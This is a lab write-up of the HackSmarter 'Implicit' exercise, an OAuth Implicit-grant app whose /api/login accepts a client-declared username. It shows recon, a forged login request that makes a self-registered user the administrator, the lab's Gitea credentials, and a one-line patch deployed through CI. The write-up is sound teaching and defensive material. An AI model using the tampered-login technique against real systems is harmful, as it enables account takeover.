---
title: Implicit
categories: [HacksmarterLabs]
tags: [web, nmap, oauth, sso, implicit-flow, access-token, account-takeover, code-review, gitea, ci-cd, flask, docker, linux]
media_subpath: /images/hacksmarter_implicit/
image:
  path: 'https://images.coursestack.com/HackSmarterLogo.png'
---

## Summary

**Implicit** is a HackSmarter web application lab that packages two objectives into a single Flask process. The first objective is an unauthenticated OAuth attack against a self-hosted "HackSmarter ID" that lets any registered user become the administrator by editing one field of a `POST /api/login` body. The second is a source-code review of the same application through a Gitea repo whose `main` branch auto-deploys to the running container, so the fix is a git push and a two-minute wait.

There is no CVE, no memory corruption, no infrastructure misconfiguration. The whole box is a single bug that spans one line of Python: after the client presents an access token, the server checks that the token exists but does not check that the token belongs to the username the client also sent. Anyone who can obtain a valid token for *any* account can log in as *any other* account, and the SSO provider hands out valid tokens to whoever registers.

The chain composes three small design decisions into a full administrator takeover:

- **Open self-service registration** on the SSO provider. Anyone can produce a session that satisfies the consent screen.
- **The OAuth Implicit grant** ships the token to the browser inside the URL fragment, which then repeats it to the resource server together with a client-declared username.
- **The resource server trusts the declared username** as long as the token is valid, without asking the SSO provider whom the token was minted for.

The patch is one `if` statement, the second objective walks the student through committing it, and Gitea Actions does the deploy. What sells the lab is the pun on the box name: the vulnerability is not just that the app uses the *Implicit* grant, it is that the app *implicitly* trusts a claim the client controls.

> **Category:** Web application. **Starting position:** unauthenticated, single host with a public web app and a public Gitea. **Goal:** capture the admin dashboard flag, then push a fix. **Theme:** an OAuth Implicit flow where identity is asserted, never verified.
{: .prompt-info }

## 1. Recon

### 1.1 Port scan

The engagement handed out a single IP; every rebuild lands on a new one, so all transcripts below use `10.0.19.125` from one deploy for consistency.

```bash
nmap -vvv -p 22,80,222,3000 -4 -sVC -Pn -oN nmap 10.0.19.125
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Werkzeug httpd 3.0.1 (Python 3.10.19)
|_http-title: Login | Hack Smarter
222/tcp  open  ssh     OpenSSH 9.3 (protocol 2.0)
3000/tcp open  http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
```

Two useful facts before touching a browser:

| Port | Service | What it means |
|---|---|---|
| 22 | Ubuntu OpenSSH 9.6 | The host itself. |
| 80 | Werkzeug 3.0.1 / Python 3.10 | Flask app, in debug mode. |
| 222 | OpenSSH 9.3 | A second sshd, almost certainly forwarded from a container. |
| 3000 | Gitea | A code-hosting service, on the same box as the app. |

---

## 2. Walking the SSO flow

The plan is to browse the flow once, all the way through, without touching anything. Half the exploit is noticing where the browser is trusted to speak for the server.

### 2.1 Landing page

`http://10.0.19.125/` renders a login card whose only affordance is a button labelled "Continue with HackSmarter ID". No local login form.

![Landing page with the "Continue with HackSmarter ID" button](01-landing-continue-hacksmarter-id.png)

That button is a link to `/sso/login`, hosted on the same origin. The SSO provider and the resource client are the same Flask process; the OAuth handshake will happen inside a single application, which is exactly what makes the identity assertion possible to forge later.

### 2.2 SSO login and self-service register

The SSO login page is a plain username/password form. We have no credentials, but the same page offers a "Register here" link that resolves to `/sso/register`.

![HackSmarter ID sign-in page](02-sso-login.png)

![HackSmarter ID registration page](03-sso-register.png)

Registration takes an arbitrary username and password and, based on how the flow behaves, drops the new account straight into whatever backing store the SSO provider uses. Any attacker can create a fresh SSO identity in a single POST.

```
POST /sso/register HTTP/1.1
Host: 10.0.19.125
Content-Type: application/x-www-form-urlencoded

username=railoca2&password=railoca2
```

```
HTTP/1.1 302 FOUND
Location: /oauth/auth
Set-Cookie: session=eyJzc29fdXNlciI6InJhaWxvY2EyIn0.am0EuQ.ixW-C7UqA0cGfGVqNL4Nf3xmWLI; HttpOnly; Path=/
```

The Flask session cookie is base64url-encoded JSON followed by a signature. The payload part decodes cleanly:

```bash
echo 'eyJzc29fdXNlciI6InJhaWxvY2EyIn0' | base64 -d
```

```
{"sso_user":"railoca2"}
```

So the SSO provider has stamped a `sso_user` claim into the session. Nothing yet claims to be a *resource* identity; the session only says "at the identity provider, you are `railoca2`". The signature is what proves the server issued it, and we cannot rewrite the payload without invalidating it. What is coming next means we do not have to: the flow itself will hand us the tools to bypass it.

### 2.3 Consent and token issuance

The register redirects to `/oauth/auth`, which the server serves only to somebody with a `sso_user` in session:

![Authorize Application consent screen for railoca](04-oauth-consent-signed-in-as-railoca.png)

Clicking Authorize submits `POST /oauth/approve`, and the response is the entire lesson:

```
HTTP/1.1 302 FOUND
Location: /#access_token=b5669afe079a45e7b0df194566970c4f&username=railoca2
```

Two things are true of that redirect, and neither is accidental:

- The token is in the URL **fragment** (`#access_token=...`), not the query string. Fragments are never sent to the server on subsequent requests; they exist only for the browser. This is the OAuth 2.0 **Implicit** grant type in its most textbook form.
- The `username` rides along in the same fragment, unsigned, right next to the token. It is a **declaration**, not a proof.

> The Implicit grant type was deprecated by [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/rfc9700) precisely because it hands the token to the browser and asks the browser to pass it on. Everything that happens next is downstream of that choice.
{: .prompt-warning }

### 2.4 The client-side hand-off

The landing page ships a small `static/js/auth.js` that watches `window.location.hash`, parses the two fragment parameters, and POSTs them to the resource server as JSON:

```javascript
if (params.access_token && params.username) {
    authenticateWithServer(params.access_token, params.username);
}

fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({access_token: token, username: username})
})
```

Which produces the request we will spend the rest of the box editing:

```
POST /api/login HTTP/1.1
Host: 10.0.19.125
Content-Type: application/json
Cookie: session=eyJzc29fdXNlciI6InJhaWxvY2EyIn0.am0EuQ...

{"access_token":"b5669afe079a45e7b0df194566970c4f","username":"railoca2"}
```

```
HTTP/1.1 200 OK
Set-Cookie: session=.eJyrViouzo8vLU4tUrJSKkrMzMlPTjRS0lECieQl5qYii9YCAG1xD5Y.am0EvA.hSlG8U46eApdp6_1bcSv8E9U6js; HttpOnly

{"success": true}
```

The dashboard for `railoca2` is public but unremarkable, no admin panel, no flag:

![Dashboard as railoca, no admin panel visible](05-dashboard-as-railoca-no-admin-panel.png)

The pieces are now on the table. We can obtain an access token whenever we want. We can also submit a `username` alongside it. The interesting question is what happens when those two disagree.

---

## 3. Objective #1: forge the identity claim

### 3.1 The tampered request

The exploit is a one-field edit. Take a valid, freshly-issued token for `railoca2`, and change the username in the JSON body:

```
POST /api/login HTTP/1.1
Host: 10.0.19.125
Content-Type: application/json

{"access_token":"b5669afe079a45e7b0df194566970c4f","username":"administrator"}
```

```
HTTP/1.1 200 OK
Set-Cookie: session=eyJzc29fdXNlciI6InJhaWxvY2EyIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.am0GQA.o3Vn5-CA-An0rmeJ8Kk4G5riSOw

{"success": true}
```

The signature is different but the payload is the interesting part. Decoding it:

```bash
echo 'eyJzc29fdXNlciI6InJhaWxvY2EyIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0' | base64 -d
```

```
{"sso_user":"railoca2","username":"administrator"}
```

The session now carries two identities. `sso_user` is what the SSO provider actually authenticated (still us). `username` is what the resource client believes the browser told it (now `administrator`). Both are signed by the same server. From this point on any handler that keys off `session['username']` treats the request as administrator.

### 3.2 Cashing the session

`/dashboard` is that handler. Loading it as `railoca2` produced the plain course-listing view; loading it now with the tampered cookie unlocks the admin panel:

![Dashboard rendered as administrator with the flag panel visible](07-dashboard-as-administrator-with-flag.png)

> The flag is shown in the screenshot only because it lives in the repo; the redacted representation in text is `HSM{redacted}`.
{: .prompt-info }

### 3.3 Why the fix is not obvious from the flow alone

Read only the browser transcript and it looks like the server should trust the client: after all, the client just presented a valid token. That reading is what the vulnerability class turns into a bug. The token *is* valid, and the token *does* prove the client talked to the SSO provider. But it does not prove *who the client is*, and the client is telling us. That is what the Implicit grant type architecturally cannot do without an ID token or a server-to-server exchange, and neither exists here.

---

## 4. Objective #2: source-code review in Gitea

The lab hands out credentials for the code host: `student:HackSmarter2026!` at `http://10.0.19.125:3000`.

![Gitea repo student/oauth-implicit-lab in the browser](08-gitea-repo-oauth-implicit-lab.png)

Clone it and go straight to `app.py`. The `api_login` handler is what we have been abusing:

```python
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json()
    client_token = data.get('access_token')
    client_username = data.get('username')

    # 1. Does the token exist in our system?
    if client_token in valid_tokens:
        session['username'] = client_username
        return jsonify({"success": True})
    else:
        return jsonify({"success": False,
                        "message": "Invalid or expired access token."}), 401
```

The `# 1.` comment above the `if` numbers the checks, and there is only one. Nothing checks step 2, which would be *"does the token belong to the user the client claims to be?"*. `valid_tokens` is a `dict` populated in `oauth_approve`:

```python
access_token = uuid.uuid4().hex
valid_tokens[access_token] = current_sso_user
```

so the mapping token to owner already exists on the server. Nobody consults it.

### 4.1 The patch

The minimal fix reads that mapping and rejects mismatched claims:

```python
if client_token in valid_tokens:
    # 2. Does the token match the username?
    if valid_tokens[client_token] != client_username:
        return jsonify({"success": False,
                        "message": "Token does not match username."}), 401
    session['username'] = client_username
    return jsonify({"success": True})
```

A stricter version would ignore `client_username` entirely and derive it from the token (`session['username'] = valid_tokens[client_token]`), removing the possibility of ever trusting a client-supplied identity again. Either is correct; the diff above is what the objective asked for.

### 4.2 Push it, and let CI/CD deploy

```bash
git clone http://10.0.19.125:3000/student/oauth-implicit-lab.git
cd oauth-implicit-lab
# edit app.py per above
git commit -am "Bind access_token to the user it was issued for"
git push origin main
```

The verifying diff:

```
diff --git a/app.py b/app.py
@@ -101,6 +101,9 @@ def api_login():

     # 1. Does the token exist in our system?
     if client_token in valid_tokens:
+        # 2. Does the token match the username?
+        if valid_tokens[client_token] != client_username:
+            return jsonify({"success": False, "message": "Token does not match username."}), 401
         session['username'] = client_username
         return jsonify({"success": True})
```

The workflow that deploys it is committed in the same repo at `.gitea/workflows/deploy.yaml`:

```yaml
name: Deploy Patch
on:
  push:
    branches:
      - main
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3
      - name: Hot-patch and Restart Lab Container
        run: |
          docker cp app.py hacksmarter-oauth-implicit:/app/app.py
          docker restart hacksmarter-oauth-implicit
```

Any push to `main` triggers a Gitea Actions runner that `docker cp`s the new `app.py` into the running container and restarts it. There is no build step, no test step, no review, no branch protection. The path from `git push` to production is one line of shell. That is the whole reason the objective works, and it is also the reason a real deployment should not look like this.

> The runner takes two to four minutes. Nothing tells you when it is done except the exploit changing behaviour.
{: .prompt-tip }

### 4.3 Verify the fix

Re-run the exact same tampered `/api/login` from the second phase. The server that used to return `{"success": true}` now short-circuits on the mismatch:

![Client landing page showing "Invalid or expired access token" after the patch is live](09-invalid-or-expired-token-after-patch.png)

The error string in the screenshot ("Invalid or expired access token") is the one from the pre-existing branch of the `if`, not the new one we added ("Token does not match username."). That is expected: the browser drops the fragment before rendering it, so by the time the client-side `auth.js` retries, the token has already been consumed, and the second attempt hits the "not in `valid_tokens`" arm. The important observation is that the tampered call no longer produces a `200`.

Repeating the intercepted `POST /api/login` from Burp with a fresh token and `username=administrator` returns the exact string we added, which is the cleanest proof the patch is live:

```
HTTP/1.1 401 UNAUTHORIZED

{"success": false, "message": "Token does not match username."}
```

---

## Understanding the Attack Chain

| Primitive | Severity in isolation | Composed |
|---|---|---|
| Open self-service registration on the SSO provider | Low. Design choice. | Grants any attacker a signed session and a valid token. |
| Access token issued via URL fragment (Implicit grant) | Medium. Retired by RFC 9700. | Combined with the trust gap below, becomes forgeable identity. |
| `/api/login` trusts client-declared `username` | High. This is the root bug. | Turns any valid token into any user's session. |
| Single Flask process plays both IdP and resource server | Low on its own. | Encourages skipping the cross-service verification step. |
| Auto-deploy on push to `main`, no gate | Low, if push access is scoped. | Turns any code-push credential into production RCE. |

**Identity is not a claim, it is a verification.** The Implicit flow gives the browser two things: a token that the server can validate, and a username that the server *cannot*. The bug is not the flow, it is treating the second like the first. The fix that closes this class of bug forever is not "check the mapping"; it is refusing to accept an identity claim over the wire at all, and always deriving the user from the token on the server side.

## Lessons Learned

- **Bind tokens to identity on the server, not by asking the client.** Every `/api/login`-style handoff must resolve the user from the token, not from a parallel field. The one-line fix here (`if valid_tokens[client_token] != client_username`) is the *minimum*; deleting the `client_username` parameter altogether is the *right* answer.
- **Do not ship new code on the OAuth 2.0 Implicit grant type.** [RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700) formalises the deprecation. Use Authorization Code with PKCE for public clients, plus an ID token or `/userinfo` call to establish identity.
